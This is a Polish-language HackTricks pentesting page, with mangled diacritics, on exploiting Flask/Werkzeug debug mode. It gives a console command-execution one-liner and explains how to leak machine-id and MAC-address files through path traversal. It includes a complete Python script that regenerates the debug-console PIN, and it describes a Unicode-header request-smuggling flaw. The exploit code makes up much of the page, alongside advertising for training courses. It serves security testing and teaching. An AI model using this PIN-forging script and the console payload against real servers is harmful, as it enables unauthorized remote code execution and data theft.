# Werkzeug / Flask Debug

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Natychmiastowa konfiguracja dostpna do oceny podatnoci i test贸w penetracyjnych**. Uruchom peny test penetracyjny z dowolnego miejsca za pomoc 20+ narzdzi i funkcji, kt贸re obejmuj rozpoznanie, a偶 po raportowanie. Nie zastpujemy pentester贸w - rozwijamy niestandardowe narzdzia, moduy wykrywania i eksploatacji, aby umo偶liwi im zagbienie si gbiej, zdobycie powok i dobr zabaw.

{% embed url="https://pentest-tools.com/" %}

## Konsola RCE

Jeli debugowanie jest aktywne, mo偶esz spr贸bowa uzyska dostp do `/console` i zdoby RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

Istnieje r贸wnie偶 kilka exploit贸w w internecie, takich jak [ten ](https://github.com/its-arun/Werkzeug-Debug-RCE)lub jeden w metasploicie.

## Zabezpieczenie PIN - Traversal cie偶ki

W niekt贸rych sytuacjach punkt kocowy **`/console`** bdzie chroniony przez PIN. Jeli masz **podatno na traversal plik贸w**, mo偶esz wyciec wszystkie niezbdne informacje do wygenerowania tego PIN-u.

### Exploit PIN konsoli Werkzeug

Wymu stron bdu debugowania w aplikacji, aby zobaczy to:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Wiadomo dotyczca scenariusza "zablokowanej konsoli" pojawia si podczas pr贸by dostpu do interfejsu debugowania Werkzeug, wskazujc konieczno podania PIN-u do odblokowania konsoli. Sugeruje si wykorzystanie PIN-u konsoli poprzez analiz algorytmu generowania PIN-u w pliku inicjalizacyjnym debugowania Werkzeug (`__init__.py`). Mechanizm generowania PIN-u mo偶na zbada w [**repozytorium kodu 藕r贸dowego Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), chocia偶 zaleca si pozyskanie rzeczywistego kodu serwera poprzez podatno na wdr贸wk po plikach ze wzgldu na potencjalne rozbie偶noci wersji.

Aby wykorzysta PIN konsoli, potrzebne s dwie grupy zmiennych: `probably_public_bits` i `private_bits`:

#### **`probably_public_bits`**

* **`username`**: Odwouje si do u偶ytkownika, kt贸ry zainicjowa sesj Flask.
* **`modname`**: Zazwyczaj oznaczany jako `flask.app`.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Zazwyczaj rozwizuje si do **Flask**.
* **`getattr(mod, '__file__', None)`**: Reprezentuje pen cie偶k do `app.py` w katalogu Flask (np. `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Jeli `app.py` nie jest dostpny, **spr贸buj `app.pyc`**.

#### **`private_bits`**

* **`uuid.getnode()`**: Pobiera adres MAC bie偶cego urzdzenia, a `str(uuid.getnode())` przeksztaca go do formatu dziesitnego.
* Aby **okreli adres MAC serwera**, nale偶y zidentyfikowa aktywny interfejs sieciowy u偶ywany przez aplikacj (np. `ens3`). W przypadku niepewnoci, **wyciek `/proc/net/arp`** w celu znalezienia identyfikatora urzdzenia, a nastpnie **wyodrbni adres MAC** z **`/sys/class/net/<identyfikator urzdzenia>/address`**.
* Konwersj szesnastkowego adresu MAC na dziesitny mo偶na wykona jak pokazano poni偶ej:

```python
# Przykadowy adres MAC: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: czy dane z `/etc/machine-id` lub `/proc/sys/kernel/random/boot_id` z pierwsz lini `/proc/self/cgroup` po ostatnim ukoniku (`/`).

<details>

<summary>Kod dla `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Po zebraniu wszystkich niezbdnych danych, skrypt wykorzystujcy exploit mo偶e zosta uruchomiony w celu wygenerowania kodu PIN konsoli Werkzeug:

Po zebraniu wszystkich niezbdnych danych, skrypt exploitu mo偶e zosta uruchomiony w celu wygenerowania kodu PIN konsoli Werkzeug. Skrypt wykorzystuje zebrane `probably_public_bits` i `private_bits` do stworzenia skr贸tu, kt贸ry nastpnie przechodzi przez dodatkowe przetwarzanie w celu wygenerowania ostatecznego PIN-u. Poni偶ej znajduje si kod w jzyku Python do wykonania tego procesu:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Ten skrypt generuje PIN poprzez hashowanie poczonych bit贸w, dodanie okrelonych soli (`cookiesalt` i `pinsalt`) oraz sformatowanie wyniku. Wa偶ne jest, aby faktyczne wartoci dla `probably_public_bits` i `private_bits` zostay dokadnie pobrane z systemu docelowego, aby zapewni, 偶e wygenerowany PIN bdzie zgodny z oczekiwanym przez konsol Werkzeug.

{% hint style="success" %}
Jeli korzystasz z **starej wersji** Werkzeug, spr贸buj zmieni **algorytm haszowania na md5** zamiast sha1.
{% endhint %}

## Znaki Unicode w Werkzeug

Jak zauwa偶ono w [**tym problemie**](https://github.com/pallets/werkzeug/issues/2833), Werkzeug nie zamyka 偶dania zawierajcego znaki Unicode w nag贸wkach. Jak wyjaniono w [**tym opracowaniu**](https://mizu.re/post/twisty-python), mo偶e to spowodowa podatno na CL.0 Request Smuggling.

Dzieje si tak, poniewa偶 w Werkzeugu mo偶na wysa pewne znaki **Unicode**, co sprawi, 偶e serwer si **zawiesi**. Jednak jeli poczenie HTTP zostao utworzone z nag贸wkiem **`Connection: keep-alive`**, tre 偶dania nie zostanie odczytana, a poczenie pozostanie otwarte, wic **tre** 偶dania zostanie potraktowana jako **nastpne 偶danie HTTP**.

## Odnoniki

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Natychmiastowa konfiguracja do oceny podatnoci i test贸w penetracyjnych**. Uruchom peny test penetracyjny z dowolnego miejsca za pomoc 20+ narzdzi i funkcji, kt贸re obejmuj rozpoznanie, a偶 po raportowanie. Nie zastpujemy tester贸w penetracyjnych - rozwijamy niestandardowe narzdzia, moduy wykrywania i eksploatacji, aby umo偶liwi im zagbienie si gbiej, zdobycie dostpu i dobr zabaw.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
